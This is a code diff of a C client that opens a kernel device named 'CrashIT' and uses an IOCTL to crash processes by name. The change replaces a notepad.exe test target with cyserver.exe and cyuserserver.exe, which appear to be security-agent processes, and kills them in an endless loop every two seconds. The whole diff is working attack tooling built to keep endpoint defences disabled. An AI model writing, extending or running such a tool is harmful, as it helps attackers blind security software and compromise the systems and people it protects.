@@ -2,7 +2,6 @@
 #include <stdio.h>
 #include "defines.h"
 
-
 #define IOCTL_CRASHIT CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 typedef struct _CRASHIT_INPUT
@@ -69,31 +68,13 @@ DWORD findProc(LPCWSTR processName) {
 	return pid;
 }
 
-
-int main(int argc, char* argv[])
-{
-	PCWSTR processName = L"notepad.exe";
+BOOL CrashProcess(HANDLE hDevice, PCWSTR processName) {
 
 	DWORD pid = findProc(processName);
 
 	if (pid == 0) {
-		wprintf(L"[-] Failed to find process %s\n", processName);
-		return 1;
-	}
-
-	HANDLE hDevice = CreateFileW(
-		L"\\\\.\\CrashIT",
-		GENERIC_READ | GENERIC_WRITE,
-		0,
-		NULL,
-		OPEN_EXISTING,
-		FILE_ATTRIBUTE_NORMAL,
-		NULL
-	);
-
-	if (hDevice == INVALID_HANDLE_VALUE) {
-		wprintf(L"[-] Failed to open device: %d\n", GetLastError());
-		return 1;
+		wprintf(L"[-] Failed to find process %ls\n", processName);
+		return FALSE;
 	}
 
 	DWORD bytesReturned;
@@ -115,10 +96,52 @@ int main(int argc, char* argv[])
 	if (!success) {
 		wprintf(L"[-] DeviceIoControl failed: %d\n", GetLastError());
 		CloseHandle(hDevice);
+		return FALSE;
+	}
+
+	wprintf(L"[+] Process %ls (PID: %lu) corrupted successfully.\n", processName, pid);
+	
+	return TRUE;
+}
+
+
+int main(int argc, char* argv[])
+{
+	PCWSTR processName = L"notepad.exe";
+
+	const wchar_t* processNames[] = {
+		L"cyserver.exe",
+		L"cyuserserver.exe",
+	};
+
+	HANDLE hDevice = CreateFileW(
+		L"\\\\.\\CrashIT",
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		wprintf(L"[-] Failed to open device: %d\n", GetLastError());
 		return 1;
 	}
 
-	printf("[+] Process %s (PID: %lu) corrupted successfully.\n", processName, pid);
+	DWORD procCount = sizeof(processNames) / sizeof(processNames[0]);
+
+	while (TRUE) {
+
+		for (size_t i = 0; i < procCount; i++) {
+			processName = processNames[i];
+			if (!CrashProcess(hDevice, processName)) {
+				wprintf(L"[-] Failed to crash process %ls\n", processName);
+			}
+		}
+
+		Sleep(2000);
+	}
 
 	return 0;
 }
